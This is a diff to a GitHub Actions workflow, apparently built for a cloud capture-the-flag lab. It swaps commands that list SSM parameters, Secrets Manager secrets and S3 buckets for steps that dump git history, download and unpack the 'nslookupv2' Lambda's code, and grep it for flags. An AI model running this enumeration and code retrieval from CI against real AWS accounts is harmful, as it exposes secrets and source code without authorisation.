@@ -21,11 +21,26 @@ jobs:
 
       - name: Invoke Vulnerable Lambda
         run: |
-          # Check Parameter Store
-             aws ssm describe-parameters
-
-                  # Check Secrets Manager
-               aws secretsmanager list-secrets
-
-               # Check S3 Buckets
-                aws s3 ls
+          echo "=== 1. SEARCHING GIT HISTORY ==="
+          # This looks at every change ever made in the repository's history
+          # We'll search for the word 'flag', 'aws', or just dump the whole history
+          git log -p || echo "No git history found or not a git repo."
+          
+          echo "=== 2. DOWNLOADING LAMBDA CODE ==="
+          # Grab the pre-signed S3 URL directly (no jq needed, AWS CLI can filter it!)
+          URL=$(aws lambda get-function --function-name nslookupv2 --query 'Code.Location' --output text)
+          
+          echo "Downloading function zip..."
+          curl -s "$URL" -o function.zip
+          
+          echo "Unzipping files..."
+          unzip -o function.zip -d lambda_source
+          
+          echo "=== 3. LISTING EXTRACTED FILES ==="
+          ls -la lambda_source
+          
+          echo "=== 4. READING THE SOURCE CODE ==="
+          cat lambda_source/lambda_function.py
+          
+          echo "=== 5. HUNTING FOR FLAGS IN THE FOLDER ==="
+          grep -Ri "flag" lambda_source/ || echo "No obvious flags found in the files."
